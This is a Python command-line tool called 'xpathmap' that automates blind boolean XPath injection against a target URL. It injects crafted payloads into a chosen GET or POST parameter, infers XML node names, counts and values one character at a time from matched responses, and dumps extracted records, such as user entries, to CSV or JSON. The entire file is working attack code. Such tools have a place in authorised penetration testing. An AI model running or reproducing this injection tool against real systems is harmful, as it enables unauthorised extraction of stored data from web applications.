#!/bin/python
import requests, argparse, re, string, random, os, pathlib, json
import urllib.parse
from functools import partial

parser = argparse.ArgumentParser(prog="xpathmap", description="XML XPath exploitation")
parser.add_argument("-u", "--url", type=str, required=True, help="the target URL")
parser.add_argument("-X", "--post", help="Send requests as POST", action="store_true")
parser.add_argument(
    "-x",
    "--proxy",
    type=str,
    help="Proxy requests to this URL",
)
parser.add_argument(
    "-mr",
    "--match-regex",
    type=str,
    help="manually match this regex in the response body",
)
parser.add_argument(
    "-mh",
    "--match-header",
    type=str,
    help="manually match this string in the response header [name:value]",
)
parser.add_argument(
    "-mc",
    "--match-code",
    type=str,
    help="manually match this HTTP status code",
)
parser.add_argument(
    "-ml",
    "--match-lines",
    type=str,
    help="manually match this number of lines in the response body",
)
parser.add_argument(
    "-ms",
    "--match-size",
    type=str,
    help="manually match this response body size",
)
parser.add_argument(
    "-mw",
    "--match-words",
    type=str,
    help="manually match this number of words in the response body",
)
parser.add_argument(
    "-p",
    "--params",
    type=str,
    help="the GET parameters to send [p1,p2,p3,...]",
    default="",
)
parser.add_argument(
    "-d",
    "--data",
    type=str,
    help="the POST parameters to send, defaults to url-encoded [p1,p2,p3,...]",
    default="",
)
parser.add_argument("-j", "--json", action="store_true", help="send POST data as json")
parser.add_argument(
    "-i", "--inject", type=str, help="the parameter name to inject", required=True
)
parser.add_argument(
    "-t",
    "--inject-type",
    type=str,
    help="the type of parameter to inject, defaults to params for GET and data for POST [data|params]",
)
parser.add_argument(
    "-H",
    "--header",
    type=str,
    help="send request header [name:value]",
    action="append",
    nargs="+",
    default=[],
)
parser.add_argument(
    "-o",
    "--output",
    type=str,
    default=None,
    help="output dumps to this folder instead of the config folder, defaults to CSV",
)
parser.add_argument(
    "-oj",
    "--output-json",
    action="store_true",
    default=False,
    help="output dumps as JSON",
)
args = parser.parse_args()
parsed_url = urllib.parse.urlparse(args.url)
config_path = f"{pathlib.Path.home()}/.xpathmap/{parsed_url.hostname}:{parsed_url.port}"
dump_path = config_path
if args.output is str:
    dump_path = args.output


def write_xml_schema(path, data):
    meta[path] = data


def read_xml_schema(path):
    if path in meta:
        return meta[path]
    else:
        return None


def save_config(data):
    if not os.path.exists(config_path):
        os.makedirs(config_path)
    with open(f"{config_path}/meta.json", "w") as f:
        json.dump(data, f)


def load_config():
    if not os.path.exists(config_path):
        os.makedirs(config_path)
    try:
        with open(f"{config_path}/meta.json", "r") as f:
            data = json.load(f)
            return data
    except:
        return None


def save_dump(path, data):
    if not os.path.exists(path):
        os.makedirs(path)
    with open(f"{path}", "w") as f:
        if not args.output_json:
            output = ""
            header = ""
            did_output_header = False
            for obj in data:
                line = ""
                for key, value in obj.items():
                    line += f"{value},"
                    if not did_output_header:
                        header += f"{key},"
                if not did_output_header:
                    output += f"{header[:-1]}\n"
                    did_output_header = True
                output += f"{line}\n"
            f.write(output[:-1])
        else:
            json.dump(data, f)


def random_string(length=5):
    return "".join(random.choice(string.ascii_letters) for i in range(length))


def print_schema(schema, depth=0):
    tabs = "  " * depth
    if isinstance(schema, dict):
        for key, value in schema.items():
            print(f"{tabs}{key}")
            print_schema(value, depth + 1)
    elif isinstance(schema, list):
        for key in schema[0]:
            print(f"{tabs}{key}")


def do_match(response):
    if args.match_regex:
        regex = re.compile(args.match_regex)
        if not regex.search(response.text):
            return False
    if args.match_header:
        arr = args.match_header.split(":")
        key = arr[0]
        value = "".join(arr[1:])

        if len(value) == 0:
            value = key
            key = ""

        if len(value) > 0:
            if len(key):
                header = response.headers[key] if key in response.headers else ""
                if not value in header:
                    return False
            else:
                has_value = False
                for header_key, header_value in response.headers.items():
                    if value in header_value:
                        has_value = True
                        break
                if not has_value:
                    return False
    if args.match_code:
        if response.status_code != int(args.match_code):
            return False
    if args.match_lines:
        if len(response.text.split("\n")) != int(args.match_lines):
            return False
    if args.match_size:
        if len(response.text) != int(args.match_size):
            return False
    if args.match_words:
        text = response.text.replace("\n", " ")
        if len(text.split(" ")) != int(args.match_words):
            return False
    return True


def test_boolean(inject):
    proxies = {}
    if parsed_url.scheme == "http":
        proxies["http"] = args.proxy
    elif parsed_url.scheme == "https":
        proxies["https"] = args.proxy

    do_params_inject = args.inject_type == "params" or (
        args.inject_type == None and not args.post
    )
    do_data_inject = args.inject_type == "data" or (
        args.inject_type == None and args.post
    )

    params_keys = args.params.split(",")
    if do_params_inject:
        params_keys.append(args.inject)
    params = {}
    for key in params_keys:
        if len(key) == 0:
            continue
        if key == args.inject and do_params_inject:
            params[key] = inject
        else:
            params[key] = random_string()

    headers = {}
    for header in args.header:
        if len(key) == 0:
            continue
        arr = header[0].split(":")
        key = arr[0]
        value = "".join(arr[1:])
        headers[key] = value

    if args.post:
        data_keys = args.data.split(",")
        if do_data_inject:
            data_keys.append(args.inject)
        data = {}
        for key in data_keys:
            if len(key) == 0:
                continue
            if key == args.inject and do_data_inject:
                data[key] = inject
            else:
                data[key] = random_string()

        if args.json:
            if not "Content-Type" in headers:
                headers["Content-Type"] = "application/json"
        else:
            if not "Content-Type" in headers:
                headers["Content-Type"] = "application/x-www-form-urlencoded"
            data = urllib.parse.urlencode(data)

        response = requests.post(
            args.url,
            data=data if not args.json else None,
            json=data if args.json else None,
            params=params,
            proxies=proxies,
            headers=headers,
        )
    else:
        response = requests.get(
            args.url, params=params, proxies=proxies, headers=headers
        )
    return do_match(response)


def test_iteration(charset, fn):
    i = 0
    for c in charset:
        if fn(c):
            return i
        i += 1
    return False


def test_char_alphalower_iteration(fn):
    index = test_iteration(string.ascii_lowercase, fn)
    return string.ascii_lowercase[index]


def test_char_alphanumericsymbol_iteration(fn):
    charset = (
        string.ascii_lowercase
        + string.digits
        + string.ascii_uppercase
        + string.punctuation
        + string.whitespace
    )
    index = test_iteration(
        charset,
        fn,
    )
    return charset[index]


def test_numeric_iteration(fn, max_length=64):
    list = []
    for i in range(0, max_length):
        list.append(i)
    return test_iteration(list, fn)


def test_node_length(path, log_prefix, length):
    # invalid' or string-length(name(/*[1]))=1 and '1'='1
    input = f"NONE' or string-length(name({path}))=" + str(length) + " and '1'='1"
    print(log_prefix + str(length), end="\r")
    return test_boolean(input)


def test_node_name_char(path, index, log_prefix, char):
    # invalid' or substring(name(/*[1]),1,1)='a' and '1'='1,
    input = f"NONE' or substring(name({path}),{str(index)},1)='{char}' and '1'='1"
    print(log_prefix + char, end="\r")
    return test_boolean(input)


def test_child_node_count(path, log_prefix, length):
    # invalid' or count(/users/*)=1 and '1'='1
    input = f"NONE' or count({path}/*)=" + str(length) + " and '1'='1"
    print(log_prefix + str(length), end="\r")
    return test_boolean(input)


def test_value_length(path, value_name, log_prefix, length):
    # invalid' or string-length(/users/user[1]/username)=1 and '1'='1
    input = f"NONE' or string-length({path}/{value_name})={str(length)} and '1'='1"
    print(log_prefix + str(length), end="\r")
    return test_boolean(input)


def test_value_char(path, value_name, index, log_prefix, char):
    # invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1
    input = (
        f"NONE' or substring({path}/{value_name},{str(index)},1)='{char}' and '1'='1"
    )
    print(log_prefix + char, end="\r")
    return test_boolean(input)


def parse_node_value(
    path,
    value_name,
    log_prefix,
):
    len = test_numeric_iteration(
        partial(test_value_length, path, value_name, log_prefix)
    )
    output = ""
    for i in range(1, len + 1):
        char = test_char_alphanumericsymbol_iteration(
            partial(test_value_char, path, value_name, i, log_prefix + output)
        )
        if char is False:
            raise Exception("Unable to parse node name")
        output += char
    return output


def parse_node_name(path, log_prefix):
    len = test_numeric_iteration(partial(test_node_length, path, log_prefix))
    output = ""
    for i in range(1, len + 1):
        char = test_char_alphalower_iteration(
            partial(test_node_name_char, path, i, log_prefix + output)
        )
        if char is False:
            raise Exception("Unable to parse node name")
        output += char
    return output


def parse_xml_structure(path="", ref={}, depth=0):
    tabs = "  " * depth
    node_count = (
        1
        if path == ""
        else test_numeric_iteration(partial(test_child_node_count, path, tabs))
    )
    if node_count == 0:
        ref = ""
    else:
        for i in range(1, node_count + 1):
            node_name = parse_node_name(f"{path}/*[{str(i)}]", tabs)
            if node_name in ref:
                obj = ref[node_name]
                ref[node_name] = [obj]
                break
            if len(node_name) > 0:
                ref[node_name] = {}
                print()
                result = parse_xml_structure(
                    path + f"/{node_name}", ref[node_name], depth + 1
                )
                if result == "":
                    ref[node_name] = ""
    return ref


def dump_xml_array(structure, path=""):
    i = 1
    result = []
    print(path)

    output = "   "
    for a in structure.keys():
        output += f"{a} "
    print(output)

    while True:
        values = {}
        log_prefix = f"{str(i)}: "
        did_set_value = False
        for node_name in structure.keys():
            value = parse_node_value(f"{path}[{str(i)}]", node_name, log_prefix)
            if value is not None and value != "":
                values[node_name] = value
                did_set_value = True
                log_prefix += f"{value} "

        if not did_set_value:
            break

        result.append(values)
        i += 1
        print()
    return result


meta = load_config() or {}
schema = read_xml_schema(parsed_url.path)
if schema:
    print(f"Loaded schema from cache: {config_path}{parsed_url.path}")
    print_schema(schema)
else:
    schema = parse_xml_structure()
    write_xml_schema(parsed_url.path, schema)
    save_config(meta)
    print(f"Saved schema to cache: {config_path}{parsed_url.path}")

print()
tables = []
table_names = []
print("select a table to dump:")
i = 0
for key, value in schema.items():
    tables.append(value)
    table_names.append(key)
    print(f"[{i}] {key}")
    i += 1
table_index = "-1"
valid_inputs = "".join(map(str, range(0, len(tables))))
while not table_index in valid_inputs:
    table_index = input(":")
table = tables[int(table_index)]
table_name = table_names[int(table_index)]

path = f"/{table_name}"
for key, value in table.items():
    path += f"/{key}"
    data = None
    if isinstance(value, dict):
        data = dump_xml_array(value, path)
    elif isinstance(value, list):
        child_schema = value[0]
        data = dump_xml_array(child_schema, path)

    extension = ".json" if args.output_json else ".csv"
    output_path = f"{dump_path}{path}{extension}"
    save_dump(output_path, data)
    print(f"Saved dump to {output_path}")
